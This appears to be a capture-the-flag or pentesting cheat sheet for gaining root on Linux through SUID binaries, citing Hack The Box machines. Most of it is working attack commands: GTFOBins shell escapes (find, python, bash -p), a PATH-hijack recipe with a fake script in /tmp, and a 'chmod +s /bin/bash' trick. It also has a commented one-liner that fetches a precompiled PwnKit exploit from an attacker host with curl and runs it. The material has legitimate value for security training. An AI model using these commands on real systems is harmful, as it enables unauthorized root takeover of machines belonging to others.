A SUID + root-owned binary runs with root's privileges for any user. If it can spawn a shell, read, or write files, that's root.
## Goal
Find non-standard root-owned SUID binaries and abuse them via GTFOBins, PATH hijack, or a known CVE.
## Tips
Ignore standard SUID (passwd, su, mount, sudo...). Hunt the odd ones: custom binaries in /opt or /usr/local, or a normal tool that shouldn't be SUID (find, vim, python, nmap).

Checklist:
- [ ] lowercase `s` in owner-exec (`-rws`)? uppercase `S` = no exec, dead
- [ ] owner = root? (non-root owner = lateral, not root)
- [ ] binary on GTFOBins?
- [ ] custom binary calling a relative command? -> PATH hijack
- [ ] pkexec present? -> PwnKit
# Commands

### Step 1: find SUID
```bash
find / -perm -u=s -type f 2>/dev/null    # SUID
find / -perm -4000 -type f 2>/dev/null   # same
```

### Step 2: analyse the odd ones
```bash
ls -la /path/bin                                     # confirm root owner + lowercase s
strings /path/bin | grep -iE 'system|exec|/bin|sh'   # what it calls
ltrace /path/bin 2>&1                                # relative cmd? = PATH hijack
```
## Exploit
### Case 1: GTFOBins SUID binary
**Enumerate:**
```bash
find / -perm -u=s -type f 2>/dev/null
# if you see something like:
-rwsr-xr-x 1 root root /usr/bin/find    # <- root-owned, SUID, on GTFOBins
```
**Exploit:**
```bash
# GTFOBins "SUID" tab (NOT Shell) — keep priv with -p / setuid(0):
/usr/bin/find . -exec /bin/sh -p \; -quit                 # find
python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'  # python (if SUID)
bash -p                                                   # bash itself if SUID
# seen on: HTB Irked, HTB Haircut
```

### Case 2: Custom SUID -> PATH hijack
**Enumerate:**
```bash
strings /opt/binary | grep -v '^/'    # calls 'service'/'curl' with no full path?
```
**Exploit:**
```bash
printf '#!/bin/bash\n/bin/bash -p\n' > /tmp/service ; chmod +x /tmp/service
export PATH=/tmp:$PATH
/opt/binary               # runs your fake 'service' as root
# seen on: HTB Magic (sysinfo PATH hijack)
```

### Case 3: Known SUID CVE
**Enumerate:**
```bash
ls -la /usr/bin/pkexec    # SUID pkexec = PwnKit candidate
```
**Exploit:**
```bash
# PwnKit (CVE-2021-4034) - pkexec, most pre-2022 Linux:
#   curl http://<YOUR_IP>/PwnKit -o /tmp/pk; chmod +x /tmp/pk; /tmp/pk
# enlightenment_sys (CVE-2022-37706) | screen 4.5.0 (CVE-2017-5618)
# seen on: HTB BoardLight (CVE-2022-37706)
```

## Helpline:
1. Reading the SUID bit
```
-rwsr-xr-x  lowercase s in owner-exec = SUID + executable  ✅
-rwSr--r--  uppercase S = SUID but NOT executable          ❌ dead
owner MUST be root (else you become that user, not root).
```

2. GTFOBins SUID tab vs Shell tab
```
use the "SUID" command, not "Shell". SUID one keeps euid=root (sh -p / setuid(0));
the plain Shell command DROPS priv back to you.
```

3. Why -p / setuid(0)
```
SUID-root binary: euid=root, ruid=you. bash/sh drop euid on start UNLESS -p.
setuid(0) makes root permanent first. -> stay root.
```

4. Make-bash-SUID primitive
```
SUID bin runs a cmd but won't pop a shell:
  <bin> ... 'chmod +s /bin/bash'  ->  /bin/bash -p
```

5. PwnKit
```
SUID pkexec + kernel pre-Jan-2022 = CVE-2021-4034.
precompiled PwnKit -> chmod +x -> run -> instant root. userland, won't crash box.
```
